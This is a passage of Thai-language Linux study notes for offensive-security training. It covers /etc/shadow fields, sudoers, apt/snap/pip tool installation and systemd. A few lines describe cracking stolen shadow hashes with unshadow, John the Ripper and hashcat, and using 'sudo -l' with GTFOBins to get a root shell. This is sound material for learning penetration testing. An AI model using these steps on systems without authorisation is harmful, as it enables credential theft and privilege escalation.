     - **หากเว้นว่างไว้ (ไม่มีค่าระหว่าง `:`):** หมายถึงบัญชีไม่มีรหัสผ่าน ใครก็สามารถล็อกอินได้ทันที (ช่องโหว่รุนแรง)
   - `lastchanged`: วันที่เปลี่ยนรหัสผ่านครั้งล่าสุด นับเป็นจำนวนวันตั้งแต่วันที่ 1 มกราคม 1970 (Unix Epoch)
   - `min`: จำนวนวันที่ต้องรอหลังจากเปลี่ยนรหัสผ่าน จึงจะยอมให้เปลี่ยนใหม่อีกครั้ง (`0` = เปลี่ยนได้ทันที)
   - `max`: อายุสูงสุดของรหัสผ่านเป็นจำนวนวัน ก่อนที่จะหมดอายุและบังคับเปลี่ยน (`99999` = ใช้งานได้ตลอดไป ไม่มีวันหมดอายุ)
   - `warn`: จำนวนวันแจ้งเตือนล่วงหน้าก่อนรหัสผ่านจะหมดอายุ (มาตรฐานคือ `7` วัน)
   - `inactive`: จำนวนวันผ่อนผันให้ใช้งานได้หลังจากรหัสผ่านหมดอายุ ก่อนที่บัญชีจะถูกระงับสิทธิ์ถาวร
   - `expire`: วันหมดอายุของบัญชีอย่างถาวร (นับเป็นจำนวนวันจาก Unix Epoch)
   - `reserved`: ฟิลด์สำรองสำหรับใช้งานในอนาคต (ปกติจะเว้นว่างไว้)
3. **มุมมอง Offensive Security ต่อนิยาม Shadow Passwords:** เมื่อแฮกเกอร์ขโมยไฟล์ `/etc/passwd` และ `/etc/shadow` มาได้ จะใช้คำสั่ง `unshadow /etc/passwd /etc/shadow > unshadowed.txt` เพื่อนำ Hash กลับมารวมกับชื่อ User แล้วส่งต่อให้ `john` (John the Ripper) หรือ `hashcat -m 1800` (สำหรับ SHA-512) ทำการ Crack แบบ Offline
4. **กับดักคำสั่ง `usermod` (ระวังการใช้ `-G` ขาด `-a`):** เมื่อต้องการเพิ่มผู้ใช้เข้ากลุ่มเสริม (เช่น กลุ่ม `sudo` เพื่อให้สิทธิ์ผู้ดูแลระบบ) **ต้องมี Flag `-a` เสมอ (`-aG`)** หากพิมพ์แค่ `usermod -G sudo user` (ไม่มี `-a`) ระบบจะ**ลบ**ผู้ใช้นั้นออกจากกลุ่มเสริมเดิมทั้งหมดทันที ทำให้เสี่ยงสูญเสียสิทธิ์สำคัญในระบบ
5. **ความแตกต่างระหว่าง `adduser` vs `useradd`:**
   - `adduser` เป็น High-level Script ที่ช่วยจัดการสร้าง Home directory และถามรหัสผ่านให้อัตโนมัติแบบ Interactive
   - `useradd` เป็น Low-level Binary หากไม่ระบุ Flag `-m` ระบบจะไม่สร้างโฟลเดอร์ Home ให้ (เมื่อล็อกอินจะขึ้นเตือน `No directory, logging in with HOME=/`)
6. **คำสั่ง `su` (ย่อมาจาก Switch User — สลับผู้ใช้งาน):**
   - **สลับเป็น Root โดยตรง (`su -`):** หากพิมพ์ `su -` โดยไม่ใส่ชื่อผู้ใช้ ระบบจะถือว่าปลายทางคือ `root` เสมอ (เทียบเท่า `su - root`)
   - **ความต่างของเครื่องหมาย `-`:** `su user` (ไม่มีขีด) สลับแค่ตัวตนแต่ยังค้างอยู่ในไดเรกทอรีเดิมและใช้ Environment เดิม (เสี่ยงเรื่อง Path Hijacking) ขณะที่ `su - user` (มีขีด) เป็น Login Shell โหลด `$PATH`, `$HOME` และไฟล์คอนฟิกประจำตัวของ User ใหม่เสมือนล็อกอินเข้ามาใหม่จริงๆ
   - **การออกจาก Session:** สามารถกดคีย์ลัด `Ctrl + D` (ส่งสัญญาณ End-of-File: EOF) หรือพิมพ์ `exit` เพื่อปิดเชลล์ชั่วคราวและดีดตัวกลับสู่ผู้ใช้เดิมทันที
7. **กฎลำดับไวยากรณ์สากล (Standard vs GNU Permutation):** ไวยากรณ์มาตรฐานตามคู่มือ `man` ของคำสั่งจัดการผู้ใช้ทั้งหมดคือ `คำสั่ง [Options] <Target>` (Options ต้องอยู่หน้าชื่อ User เสมอ เช่น `usermod --shell /bin/bash user` หรือ `useradd -m user`) แม้ว่าบน GNU/Linux จะอนุโลมให้พิมพ์สลับเอา Flag ไปไว้ด้านหลังได้เพราะมี GNU `getopt` จัดการให้เบื้องหลัง แต่บนระบบ Unix อื่นๆ (macOS, BSD, BusyBox) หรือระบบตรวจข้อสอบอัตโนมัติจะ Error ทันที
8. **สถาปัตยกรรม `/etc/sudoers` และคำสั่ง `visudo`:**
   - **กฎเหล็กการแก้ไขไฟล์:** ห้ามเปิดแก้ `/etc/sudoers` ด้วย Text Editor ทั่วไป (`nano`, `vim`) โดยตรงอย่างเด็ดขาด เพราะหากพิมพ์ Syntax ผิดแม้แต่อักขระเดียว ระบบ `sudo` จะเสียหายและล็อคตายทันทีจนไม่มีใครยกระดับสิทธิ์ได้ ต้องใช้คำสั่ง `sudo visudo` เสมอเพราะมีระบบตรวจไวยากรณ์ (Syntax Check) และ File Locking ก่อนบันทึกจริง
   - **ผ่าไวยากรณ์ 4 ส่วนหลัก (`who where=(as_whom) what`):** เช่น `%sudo ALL=(ALL:ALL) ALL`
     - `who` (`%sudo`): ผู้ใช้หรือกลุ่มที่ได้สิทธิ์ (หากเป็นกลุ่มต้องมี `%` นำหน้า)
     - `where` (`ALL`): เครื่องโฮสต์ที่อนุญาตให้รันคำสั่ง (`ALL` = ทุกเครื่อง)
     - `(as_whom)` (`(ALL:ALL)`): รันคำสั่งในฐานะ User/Group ใด (ค่า Default คือ root)
     - `what` (`ALL`): คำสั่งที่อนุญาตให้รัน (สามารถระบุเป็น Path เจาะจง เช่น `/usr/bin/apt` ได้)
   - **จุดเสี่ยงระดับวิกฤต (`NOPASSWD`):** บัญชีที่มีค่า `NOPASSWD:` เช่น `operator1 ALL=(ALL) NOPASSWD: /usr/bin/find` จะสามารถรันคำสั่งนั้นด้วยสิทธิ์ Root ได้ทันทีโดยไม่ต้องใส่รหัสผ่าน
9. **การลาดตระเวนสิทธิ์ด้วย `sudo -l` (Privilege Escalation Recon):** จุดตายสำคัญที่สุดเมื่อแฮกเกอร์ได้ Shell บนเครื่องเป้าหมาย คือการรัน `sudo -l` เพื่อดูว่าบัญชีที่ยึดได้มีสิทธิ์ NOPASSWD รันคำสั่งอะไรใน `/etc/sudoers` บ้าง แล้วนำชื่อ Binary นั้นไปค้นหาเทคนิค Bypass / Spawn Root Shell บนฐานข้อมูล **GTFOBins** ทันที

---

## Module 05: Package Management & Tool Installations
- **Status:** ✅ Completed
- **Core Concept:** การติดตั้ง อัปเดต และจัดการ Toolchain บน Debian/Kali ผ่าน APT, Debian `.deb` packages, Git source compilation และ Python PIP

### 📝 Key Notes & Mindset
- `apt update` ไม่ได้อัปเกรดโปรแกรม แต่คือการ 'ดาวน์โหลดรายการ Package ล่าสุด' จาก Repository (`/etc/apt/sources.list`)
- `apt upgrade` คือการ 'ติดตั้งเวอร์ชันใหม่' จริง ๆ ให้กับโปรแกรมในเครื่อง

### 💻 Essential Commands
```bash
# เปิดคู่มือช่วยเหลือและสรุป Option ของคำสั่ง APT (-h = help, ไม่จำเป็นต้องใช้ sudo)
apt -h

# แก้ไขคลังแพ็กเกจอย่างปลอดภัย (เปิดแก้ /etc/apt/sources.list พร้อมตรวจเช็ค Syntax อัตโนมัติ)
sudo apt edit-sources

# อัปเดตรายชื่อแพ็กเกจและอัปเกรดระบบ
sudo apt update && sudo apt upgrade -y
sudo apt full-upgrade -y        # อัปเกรดระบบเต็มรูปแบบ (ยอมลบ/ลง Dependency ใหม่ที่ขัดแย้งกัน เหมาะกับ Kali Rolling)

# ค้นหาและตรวจสอบข้อมูลแพ็กเกจในคลัง
apt search nmap                 # ค้นหาเครื่องมือในคลัง (Search by name/description)
apt show nmap                   # ส่องดูรายละเอียดเชิงลึก (เวอร์ชัน, Dependencies, ผู้พัฒนา)
apt list                        # แสดงรายชื่อแพ็กเกจทั้งหมดในคลัง

# ตรวจสอบแพ็กเกจที่ติดตั้งอยู่ในเครื่อง และกรองหาแพ็กเกจเป้าหมาย
apt list --installed
apt list --installed | grep ^nmap       # กรองเฉพาะแพ็กเกจที่ชื่อขึ้นต้นด้วย nmap (สัญลักษณ์ ^)

# ติดตั้งและถอนการติดตั้งแพ็กเกจจากคลัง APT
sudo apt install -y gobuster    # ติดตั้งเครื่องมือ Brute-force ล่า Directory/DNS สาย OffSec
sudo apt install -y seclists    # ติดตั้งคลังแสง Wordlists & Payloads มาตรฐานสากล (อยู่ที่ /usr/share/seclists)
sudo apt remove <package_name>  # ถอนการติดตั้งโปรแกรม (แต่ยังคงไฟล์ Config ไว้ในระบบ)
sudo apt purge -y <package_name> # ถอนการติดตั้งโปรแกรมพร้อมล้างไฟล์ Config ทิ้งทั้งหมด

# สำรวจและติดตั้งแพ็กเกจระดับ Low-level ผ่านไฟล์ .deb (Modern vs Legacy)
dpkg -l                         # แสดงรายการแพ็กเกจทั้งหมดในฐานข้อมูล dpkg (ขึ้นต้นด้วยสถานะ ii)
dpkg -l | grep nmap             # ค้นหาแพ็กเกจ nmap (ไม่ใช้ ^ เพราะมีคอลัมน์สถานะ ii นำหน้าชื่อ)
sudo apt install ./<filename>.deb # [Modern แนะนำ] ติดตั้งไฟล์ .deb ในเครื่องพร้อมดึง Dependencies ให้อัตโนมัติ
sudo dpkg -i <filename>         # [Legacy] ติดตั้งไฟล์ .deb โดยตรง (หากขาด Dependency ต้องแก้ด้วยคำสั่งล่าง)
sudo apt --fix-broken install -y   # ซ่อมแซมและดึง Dependencies ที่ค้างให้สมบูรณ์หลังใช้ dpkg

# จัดการแพ็กเกจผ่าน Aptitude (Interactive Terminal UI พร้อมตัวช่วยแก้ Dependency ขัดแย้ง)
sudo aptitude                   # เปิดอินเทอร์เฟซแบบเมนูใน Terminal (TUI)
sudo aptitude install <package> # ติดตั้งพร้อมระบบเสนอทางเลือกแก้ปัญหาไลบรารีชนกัน

# ติดตั้งและเปิดใช้งานระบบ Universal Package ผ่าน Snap
sudo apt install -y snapd       # ติดตั้งระบบ Snap (แพ็กเกจชื่อ snapd ย่อมาจาก Snap Daemon ไม่ใช่ snap)
sudo systemctl enable --now snapd.socket # เปิดการทำงานของ Snap daemon socket ทันที
sudo ln -s /var/lib/snapd/snap /snap    # สร้าง Symlink เชื่อมพาธมาตรฐานสำหรับโปรแกรมแบบ --classic บน Debian/Kali
sudo snap install --classic code # ติดตั้ง VS Code แบบปลดล็อก Sandbox (--classic เพื่อให้เข้าถึงระบบไฟล์ได้)

# การอัปเดตแอปพลิเคชันเฉพาะตัว (ตัวอย่าง: VS Code ตามช่องทางที่เลือกติดตั้ง)
sudo apt update && sudo apt --only-upgrade install code -y # อัปเดตเฉพาะ VS Code (สำหรับผู้ที่ลงผ่าน .deb / APT Repo)
sudo snap refresh code          # สั่งอัปเดตเฉพาะ VS Code ผ่าน Snap (หรือ sudo snap refresh เพื่ออัปเดตทั้งหมด)
sudo snap revert code           # ย้อนกลับ (Rollback) ไปเวอร์ชันก่อนหน้าทันทีหากอัปเดตใหม่มีปัญหา

# จัดการเครื่องมือจากภายนอก (Git & Python Toolchain)
git clone https://github.com/fleetcaptain/Turbolist3r.git # โคลนคลังโค้ดเครื่องมือสาย Recon จาก GitHub
cd Turbolist3r                                           # เข้าสู่โฟลเดอร์ของเครื่องมือก่อนรัน
pip3 install -r requirements.txt                         # ติดตั้ง Python Dependencies ตามรายการในไฟล์

# จัดการข้อจำกัด Externally Managed Environment บน Kali ยุคใหม่ (PEP 668):
pip3 install -r requirements.txt --break-system-packages # บังคับติดตั้งลงระดับระบบโดยตรง (เหมาะกับ VM ทดสอบ/CTF)
python3 -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt # หรือสร้าง Virtual Environment แยกเพื่อความสะอาด

# เรียกใช้งานสคริปต์เครื่องมือ OffSec (ตัวอย่าง: TurboList3r สแกนหา Subdomain)
python3 turbolist3r.py -h           # แสดงคู่มือการใช้งานและ Flags ทั้งหมด (-h = --help)
python3 turbolist3r.py -d <domain>  # สั่งสแกนหา Subdomain ของโดเมนเป้าหมาย (-d = --domain เช่น example.com)
```

### 🧠 Feynman Takeaway & Reflection
#### 💡 แก่นความคิดและกลไกสำคัญ (Core Mental Models)
หัวใจสำคัญของ Module นี้คือการเข้าใจ **"สถาปัตยกรรม 2 ระดับชั้นของ Package Manager"** ทั้งในระดับ OS และระดับภาษาโปรแกรม:
1. **โครงสร้างสถาปัตยกรรมระดับ OS (Low-level vs High-level):**
   - **Low-level Engine (`dpkg`):** เปรียบเหมือน "กรรมกรหน้างาน" มีหน้าที่แตกไฟล์และติดตั้งแพ็กเกจเดี่ยวๆ (`.deb`) ลงเครื่องโดยตรง แต่มันมองไม่เห็นภาพรวมและดาวน์โหลดของเองไม่เป็น หากขาด Dependency มันจะร้อง Error และยอมแพ้ทันที
   - **High-level Resolver (`apt` / `aptitude`):** เปรียบเหมือน "สถาปนิกผู้คุมงาน" ทำหน้าที่ติดต่อคลังซอฟต์แวร์ (Repositories) บนอินเทอร์เน็ต คำนวณกราฟความเชื่อมโยงของไลบรารีทั้งหมด ดาวน์โหลดตัวที่ขาดให้อัตโนมัติ แล้วค่อยส่งต่อให้ `dpkg` เป็นผู้ลงมือติดตั้งตามลำดับที่ถูกต้อง
2. **ความเชื่อมโยงข้ามไปยังระดับภาษาโปรแกรม (Language Package Managers):**
   - โลกของภาษาโปรแกรมลอกแบบ Design Pattern เดียวกันนี้มาใช้อย่างสมบูรณ์:
     - **Python ➔ `pip`:** ทำหน้าที่ดึงและจัดการไลบรารีจาก PyPI (ผ่านไฟล์ `requirements.txt`)
     - **Ruby ➔ `gem`:** ทำหน้าที่ดึงและจัดการไลบรารีจาก RubyGems (เครื่องมือสาย OffSec หลายตัวในอดีตเช่น WPScan และโมดูลของ Metasploit ถูกขับเคลื่อนด้วย Ruby)
3. **OffSec Perspective (มุมมองนักทดสอบเจาะระบบ):**
   - ในงานปฏิบัติการจริง เครื่องมือโจมตี/ลาดตระเวน (Exploit / Recon) ใหม่ล่าสุดมักจะไม่ได้อยู่ในคลัง APT แต่จะถูกเผยแพร่บน GitHub
   - นักเจาะระบบจึงต้องอ่านออกทันทีว่าเครื่องมือนี้เขียนด้วยภาษาอะไร: ถ้าเป็น **Python** ต้องวิ่งหา `pip` / `venv`, ถ้าเป็น **Ruby** ต้องวิ่งหา `gem`, หรือถ้าเป็นแอปพลิเคชันสำเร็จรูป ต้องเลือกว่าจะลงแบบ **`.deb`** ผ่าน `apt install ./...` หรือแบบ Universal Containerized ผ่าน **`snap`**
   - การเข้าใจลำดับชั้นเหล่านี้ช่วยให้จัดการ Dependency และสร้างคลังอาวุธใน Kali Linux ได้อย่างรวดเร็วและเป็นระบบ

#### ⚠️ กับดักทางเทคนิคและข้อควรระวัง (Gotchas & Pitfalls)
1. **ความแตกต่างของ Output ระหว่าง `apt list` vs `dpkg -l` (กับดัก Regex `^`):**
   - ในคำสั่ง `apt list --installed` ชื่อแพ็กเกจจะอยู่ที่**ต้นบรรทัดโดยตรง** (เช่น `nmap/kali-rolling...`) ดังนั้นการใช้ `grep ^nmap` (ที่กำหนดว่าบรรทัดต้องขึ้นต้นด้วย nmap) จึงทำงานได้อย่างถูกต้อง
   - แต่ในคำสั่ง `dpkg -l` ทุกบรรทัดจะมีคอลัมน์แสดงรหัสสถานะของแพ็กเกจนำหน้าเสมอ เช่น `ii  nmap  7.94...` (โดย `ii` หมายถึง Desired: Install, Status: Installed) ทำให้ตัวอักษรแรกสุดของบรรทัดคือตัว `i` ไม่ใช่ `n` ดังนั้นการใช้ `grep ^nmap` จึง**หาไม่เจอเลย** ต้องใช้ `grep nmap` ธรรมดา หรือเจาะจงด้วย `grep "^ii  nmap"`
2. **`apt upgrade` vs `apt full-upgrade`:**
   - `apt upgrade`: อัปเกรดแพ็กเกจเวอร์ชันใหม่เฉพาะตัวที่ไม่ต้องถอนการติดตั้งแพ็กเกจเดิมออก (เน้นความปลอดภัย ไม่ยอมลบของเก่า)
   - `apt full-upgrade` (หรือ `dist-upgrade`): จัดการ Dependency ใหม่แบบสมบูรณ์ โดยยอมสั่งลบแพ็กเกจเก่าที่ขัดแย้งกัน (Conflict) หรือติดตั้งแพ็กเกจเสริมใหม่ที่จำเป็น เหมาะสำหรับ Distro แบบ Rolling Release เช่น Kali Linux
3. **คำสั่ง `aptitude` (ผู้ช่วยแก้ปัญหา Dependency Hell):**
   - เป็นเครื่องมือจัดการแพ็กเกจระดับสูงที่มีทั้ง CLI และหน้าต่างเมนู Interactive TUI (เปิดด้วย `sudo aptitude`)
   - **จุดเด่นที่สุด:** เมื่อเกิดปัญหาแพ็กเกจพังหรือรุ่นไลบรารีขัดแย้งกัน (Dependency Conflicts) ตัว `apt` มักจะยอมแพ้และขึ้น Error ทันที แต่ `aptitude` มีอัลกอริทึมคำนวณทางเลือก (Heuristic Conflict Resolver) เสนอวิธีแก้ไขให้แอดมินเลือกว่าจะยอม Downgrade หรือถอดตัวไหนออกทีละ Step เพื่อกู้ระบบกลับมา
4. **สถาปัตยกรรม Snap Packages, Confinement และการแก้ปัญหา Symlink FHS:**
   - **ระบบ Snap (`snapd` vs `snap`):** ตัวจัดการ Snap มีชื่อแพ็กเกจว่า `snapd` (Snap Daemon) คำสั่งติดตั้งคือ `sudo apt install snapd` (ห้ามสั่ง `apt install snap` เพราะเป็นโปรแกรมพันธุศาสตร์ระดับโมเลกุล)
   - **Containerized Apps & Confinement Modes:** Snap รวมตัวโปรแกรมและ Dependencies ทั้งหมดไว้ในแพ็กเกจก้อนเดียว (`.snap`) รันแบบแยกอิสระ โดยปกติจะใช้ **Strict Confinement** (กักบริเวณใน Sandbox อย่างเข้มงวด) แต่หากเป็นเครื่องมือประเภท IDE หรือ Code Editor (เช่น VS Code) จำเป็นต้องระบุแฟล็ก **`--classic`** เพื่อปลดล็อก Sandbox ให้เข้าถึงไฟล์ระบบ, คอมไพเลอร์ และเทอร์มินัลของเครื่องโฮสต์ได้
   - **Symlink `/snap` เพื่อความเข้ากันได้กับ FHS:** บน Debian/Kali ระบบยึดตามมาตรฐาน FHS โดยเก็บข้อมูล Snap ไว้ที่ `/var/lib/snapd/snap` แต่โปรแกรมที่คอมไพล์แบบ `--classic` มักถูกฝังพาธตายตัว (Hardcoded Path) ให้เรียกจาก `/snap/...` เสมอ จึงต้องสร้างทางลัดเสมือนด้วย `sudo ln -s /var/lib/snapd/snap /snap` เพื่อให้โปรแกรมมองเห็นไฟล์ตามพาธที่คาดหวัง
5. **ทางเลือกการติดตั้ง VS Code บน Linux และวงจรการอัปเดต (Complete Matrix):**
   - **ตารางเปรียบเทียบ 5 ช่องทางการติดตั้ง VS Code บน Debian / Kali / Ubuntu:**
     | วิธีการติดตั้ง | คำสั่ง / กลไกหลัก | จุดเด่น / พฤติกรรมระบบ | แนวทางการอัปเดต (Update Lifecycle) |
     |---|---|---|---|
     | **1. Official `.deb`** *(แนะนำที่สุด)* | `sudo apt install ./code.deb` | โหลดตรงจาก Microsoft; ตัวติดตั้งจะแอบผูก Official APT Repo ให้เองอัตโนมัติ | อัปเดตอัตโนมัติผ่าน `sudo apt update && sudo apt upgrade` |
     | **2. Microsoft APT Repo** | `sudo apt install code` | ผูก GPG Key และคลัง Repo ด้วยตนเองก่อนติดตั้ง เหมาะกับสาย Automation/CI | อัปเดตผ่าน `sudo apt update && sudo apt upgrade` |
     | **3. Snap Package** | `sudo snap install --classic code` | จบในคำสั่งเดียว รวม Dependencies ในตัว ไม่ต้องตั้งค่า Repo (ดูรายละเอียด Confinement ในข้อ 4) | Auto-update เบื้องหลังวันละ 4 ครั้ง หรือสั่ง `sudo snap refresh code` |
     | **4. VSCodium** *(สาย OffSec/Privacy)* | `sudo apt install codium` | Open-Source 100% ตัดโค้ด Telemetry และระบบ Tracking ของ Microsoft ออกทั้งหมด | อัปเดตผ่านคลัง Repo ของ VSCodium |
     | **5. Tarball (`.tar.gz`)** | แตกไฟล์ `tar -xzf ...` | รันตรงแบบ Portable ไม่ต้องยุ่งกับระบบสิทธิ์ OS | โหลดทับไฟล์เดิมด้วยตนเอง (Manual Update) |
   - **เจาะลึกวิธี Official `.deb` Package:**
     1. **ดาวน์โหลด:** โหลดไฟล์ `.deb` จากเว็บไซต์ทางการ [code.visualstudio.com](https://code.visualstudio.com)
     2. **ติดตั้งด้วย `sudo apt install ./code.deb`:** ต้องมี `./` นำหน้าเสมอ เพื่อระบุว่าเป็นไฟล์ในเครื่อง (APT จะคำนวณและดึง Dependency ที่ขาดมาลงให้อัตโนมัติเหนือกว่า `dpkg -i`)
     3. **กลไก Auto-Repo Hook:** ขณะติดตั้ง ระบบจะนำเข้า GPG signing key และสร้างไฟล์คลังที่ `/etc/apt/sources.list.d/vscode.list` ให้เองโดยอัตโนมัติ
   - **แนวทางการอัปเดตในทางปฏิบัติ:**
     - **หากลงผ่าน `.deb` หรือ APT Repo:** อัปเดตพร้อมระบบด้วย `sudo apt update && sudo apt upgrade -y` หรือเฉพาะตัวด้วย `sudo apt update && sudo apt --only-upgrade install code -y`
     - **หากลงผ่าน Snap:** อัปเดตอัตโนมัติผ่าน Daemon หรือสั่งทันทีด้วย `sudo snap refresh code` (และถอยกลับด้วย `sudo snap revert code` หากพบปัญหา)
6. **การติดตั้ง Dependencies เครื่องมือ Python ด้วย `pip3` (และกับดัก PEP 668 บน Kali):**
   - **คำสั่ง `pip3 install -r requirements.txt` ทำงานอย่างไร:**
     - `requirements.txt` เป็นไฟล์สารบัญระบุรายการ Python Packages พร้อมเวอร์ชันที่โปรเจกต์/เครื่องมือนั้นต้องการ
     - แฟล็ก `-r` (หรือ `--requirement`) สั่งให้ pip อ่านไฟล์นี้ทีละบรรทัดแล้วดาวน์โหลดติดตั้ง dependencies ทั้งหมดให้เสร็จสิ้นในคำสั่งเดียว
   - **กับดัก `error: externally-managed-environment` (PEP 668):**
     - บน Kali Linux หรือ Debian ยุคใหม่ (Debian 12 Bookworm ขึ้นไป) ระบบจะล็อกไม่ให้ใช้ `pip3 install` ระดับ Global เพื่อป้องกันไม่ให้ไลบรารีของ Python ไปตีกับแพ็กเกจระบบของ APT
     - **ทางออกในสายงาน OffSec:**
       1. **แนวทาง Clean (มาตรฐาน):** สร้าง Python Virtual Environment แยกโปรเจกต์ (`python3 -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt`)
       2. **แนวทาง Tactical Fast (ใช้ใน CTF / Kali VM ส่วนตัว):** ใส่แฟล็ก `--break-system-packages` เพื่อสั่งให้ pip บังคับเขียนทับลงระบบส่วนกลางทันที
7. **วงจรการติดตั้งและรันสคริปต์ OffSec บน Linux (กรณีศึกษา `turbolist3r.py`):**
   - **TurboList3r คืออะไร:** เครื่องมือรวบรวมข้อมูลข่าวกรอง (OSINT / Subdomain Enumeration) เขียนด้วยภาษา Python พัฒนาต่อยอดจาก Sublist3r ทำหน้าที่สแกนค้นหา Subdomain ที่ซ่อนอยู่ของเป้าหมาย (เช่น `admin.target.com`, `vpn.target.com`, `api.target.com`) ผ่าน Search Engines ชั้นนำและฐานข้อมูลสาธารณะ (Google, Yahoo, VirusTotal, crt.sh ฯลฯ)
   - **ความหมายของคำสั่งและ Flags:**
     - `python3 turbolist3r.py -h`: แสดงหน้าต่างคู่มือและวิธีใช้ (`-h` = `--help`) เป็นแนวปฏิบัติมาตรฐานของแฮกเกอร์/นักทดสอบเจาะระบบเมื่อใช้เครื่องมือใหม่ เพื่อตรวจสอบ Options เสริม (เช่น `-t` ตั้ง Threads, `-o` เซฟไฟล์, `-p` สแกนพอร์ต)
     - `python3 turbolist3r.py -d <domain>`: สั่งเริ่มการสแกนโดยระบุโดเมนเป้าหมาย (`-d` = `--domain` เช่น `example.com`)
   - **มาตรฐานลำดับขั้นตอนการใช้เครื่องมือภายนอก (OffSec Git-to-Run Pipeline):**
     `git clone https://github.com/fleetcaptain/Turbolist3r.git` ➔ `cd Turbolist3r` ➔ `pip3 install -r requirements.txt` ➔ `python3 turbolist3r.py -h` ➔ `python3 turbolist3r.py -d target.com`
   - **ความสัมพันธ์ระหว่าง Tools (ปืน) และ SecLists (กระสุน):**
     - เครื่องมืออย่าง `gobuster` หรือเครื่องมือสแกนอื่นๆ จำเป็นต้องมี Wordlists เพื่อใช้คาดเดาชื่อไฟล์/ไดเรกทอรี
     - Kali Linux บรรจุคลัง **SecLists** ลงใน APT ให้ติดตั้งได้ทันทีผ่าน `sudo apt install -y seclists` โดยไฟล์พจนานุกรมและเพย์โหลดทั้งหมดจะถูกจัดเก็บไว้ที่ `/usr/share/seclists/` พร้อมนำไปเป็น Argument ป้อนให้เครื่องมือสแกนทำงาน
---

## Module 06: Systemd Services & Daemon Management
- **Status:** ✅ Completed
- **Core Concept:** การควบคุม Background Services (Daemons) บน Linux: การเปิด Web server, SSH, Database และการทำให้ Service รันอัตโนมัติเมื่อ Boot

### 📝 Key Notes & Mindset
- **Boot Chain:** `Boot ➔ Kernel ➔ Systemd (PID 1)` — เมื่อเคอร์เนลบูตเสร็จ จะเรียก Systemd มารับช่วงต่อเพื่อ Mount File System และสั่งรัน Services ทั้งหมดผ่านกลไก **Forking**
- `systemd` ทำหน้าที่เป็น Service Manager ("Master Daemon / Boss of the Daemons") โดยมองทุกทรัพยากรในระบบเป็น **"Units"** (โดย Daemons จะอยู่ในประเภท `.service`)
- การควบคุม Units ทำผ่านรีโมตคำสั่ง **`systemctl`** (ตรวจ `status` / `is-active` / `is-enabled`, สั่ง `start`/`stop`/`restart`, `reload-or-restart`, และตั้ง `enable`/`disable`)
- การตรวจสถานะ (`sudo systemctl status <service>`): ควรใส่ `sudo` เพื่อปลดล็อกให้อ่าน Log เหตุการณ์ล่าสุดท้ายคำสั่งได้อย่างครบถ้วน ไม่ถูกตัดทอนตามสิทธิ์ความปลอดภัย

### 💻 Essential Commands
```bash
# ตรวจสอบสถานะของ Service (ใส่ sudo เพื่อแสดงข้อความ Log ล่าสุดแบบเต็ม ไม่ถูกซ่อน)
sudo systemctl status ssh        # ตรวจสอบสถานะ SSH (บน Debian/Kali สั่ง ssh หรือ sshd ก็ได้ผลลัพธ์เดียวกัน)

# ตรวจสอบสถานะแบบกระชับ (Clean Output สำหรับงาน Bash Scripting / Automation - ไม่ต้องใช้ sudo)
systemctl is-active ssh          # ถามว่า "กำลังรันอยู่ไหม?" (คืนค่า active หรือ inactive / exit code 0 เมื่อรันอยู่)
systemctl is-enabled ssh         # ถามว่า "เปิดอัตโนมัติตอนบูตไหม?" (คืนค่า enabled หรือ disabled / exit code 0 เมื่อเปิด)

# เริ่มต้น / หยุด / รีสตาร์ท / โหลดคอนฟิกใหม่แบบยืดหยุ่น (Graceful reload fallback)
sudo systemctl start ssh
sudo systemctl stop ssh
sudo systemctl restart ssh
sudo systemctl reload-or-restart sshd # โหลดคอนฟิกใหม่โดยไม่ตัดการเชื่อมต่อ (ถ้า service รองรับ reload) หรือ restart ให้อัตโนมัติหากไม่รองรับ

# สั่งให้ Service รันอัตโนมัติทุกครั้งที่เปิดเครื่อง (Enable) / ปิดการรันอัตโนมัติ (Disable)
sudo systemctl enable ssh
sudo systemctl disable ssh
sudo systemctl enable --now ssh   # คำสั่งคอมโบระดับ Pro: สั่ง enable ให้เริ่มตอนบูต พร้อมกับ start ทันที ณ วินาทีนั้น

# คำสั่งยุคดั้งเดิม (SysVinit Wrapper - ปัจจุบันส่งต่อไปหา systemctl เบื้องหลังให้อัตโนมัติ)
sudo service ssh start            # เทียบเท่า sudo systemctl start ssh (พบบ่อยในบทความและสคริปต์รุ่นเก่า)
sudo service ssh status           # เทียบเท่า sudo systemctl status ssh

# ส่องดู Units ทั้งหมดในระบบ (Unfiltered View: รวม Service, Socket, Mount, Device ฯลฯ)
systemctl list-units

# ส่องดูเฉพาะ Background Daemons ด้วยชอร์ตแฟล็ก -t (เทียบเท่า --type=service)
systemctl list-units -t service                         # ดู Services ทั้งหมดที่โหลดอยู่ใน RAM
systemctl list-units -t service --state=running         # กรองดูเฉพาะ Daemons ที่กำลังรันอยู่จริง
systemctl list-units -t service --state=failed          # ท่าสเกาต์หา Service ที่แครช/พัง เพื่อแก้ปัญหาทันที

# ส่องไฟล์ Unit ติดตั้งบนดิสก์ (/lib/systemd/system/ และ /etc/systemd/system/) เพื่อตรวจสถานะการบูต
systemctl list-unit-files -t service                    # ดูสถานะการบูต (enabled/disabled/masked) ของทุก Service
systemctl list-unit-files | grep ssh                    # ค้นหา Service เป้าหมายว่าติดตั้งอยู่ไหม และบูตอัตโนมัติหรือไม่
systemctl list-unit-files "ssh*"                        # ค้นหาด้วย Pattern Matching ในตัวโดยไม่ต้องต่อท่อ grep

# ตรวจสอบและวิเคราะห์ Log ของ Service เมื่อเกิดปัญหา (Troubleshooting)
sudo journalctl -u ssh -f                         # ดู Live Log แบบเกาะติดเรียลไทม์ (-f = follow)
sudo journalctl -xe                              # ส่องข้อผิดพลาดระบบท้ายสุด (-e) พร้อมแคตตาล็อกอธิบายสาเหตุเชิงลึก (-x)
sudo journalctl -xeu nginx                       # กรองดูเฉพาะข้อผิดพลาดของ Service เป้าหมาย (เช่น nginx)

# แก้ปัญหาเมื่อ Logging Daemon ค้าง / Log ไม่ยอมบันทึก
sudo systemctl restart systemd-journald          # รีสตาร์ทตัวบริการจัดเก็บ Log ของ Systemd เมื่อ journalctl ค้างหรือว่างเปล่า

# ตรวจสอบ Process ที่รันอยู่เบื้องหลังในตาราง Kernel Process Table
ps aux | grep <process_name>    # ค้นหา Process ตามชื่อทั่วไป
ps aux | grep [s]shd            # ค้นหา SSH Daemon โดยไม่ติดบรรทัด grep ตัวเอง (ใช้ [ ] ครอบตัวอักษรแรก)
ps aux | grep [s]ubl            # ค้นหา Sublime Text (หรือ ps aux | grep [n]ano)
